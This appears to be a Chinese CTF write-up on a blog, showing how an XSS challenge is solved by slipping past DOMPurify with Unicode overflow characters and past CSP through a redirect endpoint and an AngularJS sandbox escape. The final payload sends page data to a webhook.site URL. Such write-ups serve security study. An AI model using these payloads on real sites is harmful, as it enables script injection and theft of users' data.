@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>从一道XSS题学习CSP绕过 - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='XSS, unicode, CSP'>
+  <meta itemprop="name" content="从一道XSS题学习CSP绕过">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2025-02-11T00:06:40+08:00">
+  <meta itemprop="dateModified" content="2025-02-11T00:06:40+08:00">
+  <meta itemprop="wordCount" content="599">
+  <meta itemprop="image" content="http://localhost:1313/avatar.png">
+  <meta itemprop="keywords" content="XSS,Unicode,CSP"><meta property="og:url" content="http://localhost:1313/%E4%BB%8E%E4%B8%80%E9%81%93xss%E9%A2%98%E5%AD%A6%E4%B9%A0csp%E7%BB%95%E8%BF%87/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="从一道XSS题学习CSP绕过">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-11T00:06:40+08:00">
+    <meta property="article:modified_time" content="2025-02-11T00:06:40+08:00">
+    <meta property="article:tag" content="XSS">
+    <meta property="article:tag" content="Unicode">
+    <meta property="article:tag" content="CSP">
+    <meta property="og:image" content="http://localhost:1313/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/avatar.png">
+  <meta name="twitter:title" content="从一道XSS题学习CSP绕过">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/%E4%BB%8E%E4%B8%80%E9%81%93xss%E9%A2%98%E5%AD%A6%E4%B9%A0csp%E7%BB%95%E8%BF%87/" title="从一道XSS题学习CSP绕过 - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/2025-n1ctf-junior-web%E7%AF%87%E5%85%A8/" title="2025-N1CTF Junior-Web篇(全)" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/%E4%BB%8E%E4%B8%80%E9%81%93xss%E9%A2%98%E5%AD%A6%E4%B9%A0csp%E7%BB%95%E8%BF%87/index.md" title="从一道XSS题学习CSP绕过 - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "从一道XSS题学习CSP绕过",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/%E4%BB%8E%E4%B8%80%E9%81%93xss%E9%A2%98%E5%AD%A6%E4%B9%A0csp%E7%BB%95%E8%BF%87\/"
+    },"genre": "posts","keywords": "XSS, unicode, CSP","wordcount":  599 ,
+    "url": "http:\/\/localhost:1313\/%E4%BB%8E%E4%B8%80%E9%81%93xss%E9%A2%98%E5%AD%A6%E4%B9%A0csp%E7%BB%95%E8%BF%87\/","datePublished": "2025-02-11T00:06:40+08:00","dateModified": "2025-02-11T00:06:40+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">从一道XSS题学习CSP绕过</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>从一道XSS题学习CSP绕过</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2025-02-11 00:06:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-02-11">2025-02-11</time></span>&nbsp;<span title="599 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-解题记录">0x00 解题记录</a></li>
+    <li><a href="#reference">Reference</a></li>
+    <li><a href="#0x00000">0x00000</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="0x00-解题记录" class="heading-element"><span>0x00 解题记录</span>
+  <a href="#0x00-%e8%a7%a3%e9%a2%98%e8%ae%b0%e5%bd%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>/create</code>可以创建笔记存入到数据库，<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102148138.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102148138.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102148138.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102148138.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102148138.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102148138.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>/note</code>可以展示笔记<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102149796.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102149796.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102149796.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102149796.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102149796.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102149796.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+但在<code>/create</code>处存在<code>DOMPurify</code>来过滤<code>xss</code>，由于是最新版无法绕过，<br>
+需要注意到在<code>/note</code>笔记展示的地方，是利用了<code>ascii</code>来处理了字符串，<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102151665.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102151665.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102151665.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102151665.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102151665.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102151665.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+这里会涉及到一个<code>unicode</code>溢出的安全问题<br>
+举一个🌰<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102158214.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102158214.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102158214.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102158214.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102158214.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102158214.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+利用这个原理，选两个<code>unicode</code>字符来逃逸<code>&lt;&gt;</code><br>
+<code>氼</code>、<code>夾</code><br>
+来试一下，正常的解析了<code>&lt;&gt;</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102203883.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102203883.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102203883.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102203883.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102203883.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102203883.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+构造一个payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">氼script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;https://www.example.com&#34;</span><span class="nx">夾alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//氼/script 夾  
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>正常触发了CSP<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102208902.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102208902.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102208902.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102208902.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102208902.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102208902.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+现在就需要绕过CSP了，利用<code>/redirect</code>接口绕过CSP即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">setHeader</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Security-Policy&#34;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">    <span class="sb">`script-src &#39;self&#39; &#39;nonce-</span><span class="si">${</span><span class="nx">nonce</span><span class="si">}</span><span class="sb">&#39; &#39;unsafe-eval&#39; https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js; base-uri &#39;none&#39;; object-src &#39;none&#39;;`</span>  
+</span></span><span class="line"><span class="cl">  <span class="p">);</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102220072.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102220072.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102220072.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102220072.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102220072.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102220072.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+还需要利用到<code>angular</code>组件，原因如下<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102348192.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102348192.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102348192.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102348192.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102348192.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102348192.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+在重定向只会忽略路径部分，而不会忽略URL，而CSP中又恰巧信任了<code>https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">氼script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;http://localhost:3000/redirect?url=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&#34;</span> <span class="nx">夾</span>  <span class="c1">//氼/script 夾  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="nx">div</span> <span class="nx">data</span><span class="o">-</span><span class="nx">ng</span><span class="o">-</span><span class="nx">app</span><span class="o">&gt;</span> <span class="p">{{</span><span class="s1">&#39;a&#39;</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">charAt</span><span class="o">=</span><span class="p">[].</span><span class="nx">join</span><span class="p">;</span><span class="nx">$eval</span><span class="p">(</span><span class="s1">&#39;x=1} } };alert(1);//&#39;</span><span class="p">);}}</span> <span class="o">&lt;</span><span class="err">/div&gt;  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>（这里在本地搭建了一个作为测试）<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102359533.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102359533.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102359533.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102359533.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102359533.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102359533.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+根据<code>bot.ts</code>来盗取<code>flag</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110001119.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110001119.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110001119.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110001119.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110001119.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110001119.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">氼script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;http://localhost:3000/redirect?url=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&#34;</span> <span class="nx">夾</span>  <span class="c1">//氼/script 夾  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="nx">div</span> <span class="nx">data</span><span class="o">-</span><span class="nx">ng</span><span class="o">-</span><span class="nx">app</span><span class="o">&gt;</span><span class="p">{{</span><span class="s1">&#39;a&#39;</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">charAt</span><span class="o">=</span><span class="p">[].</span><span class="nx">join</span><span class="p">;</span><span class="nx">$eval</span><span class="p">(</span><span class="s1">&#39;x=1} } };  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    fetch(`http://localhost:3000/`).then(res=&gt;res.text()).then(data=&gt;{ const parser = new DOMParser();  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    const doc = parser.parseFromString(data, &#34;text/html&#34;);  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    const links = Array.from(doc.querySelectorAll(&#34;a&#34;)).map(a =&gt; a.href);  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    const encodedLinks = btoa(unescape(encodeURIComponent(JSON.stringify(links))));  
+</span></span></span><span class="line"><span class="cl"><span class="s1">    return fetch(&#34;https://webhook.site/5b154691-3fdb-46b8-980b-735e19b081f2?ans=&#34; + encodedLinks, { method: &#34;GET&#34;, mode: &#34;no-cors&#34; })});//&#39;</span><span class="p">);}}</span><span class="o">&lt;</span><span class="err">/div&gt;  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110004738.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110004738.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110004738.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110004738.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110004738.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110004738.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="reference" class="heading-element"><span>Reference</span>
+  <a href="#reference" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><a href="https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows" title="https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows"target="_blank" rel="external nofollow noopener noreferrer">https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows</a><a href="https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects"target="_blank" rel="external nofollow noopener noreferrer">https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects</a><br>
+<a href="https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques</a><br>
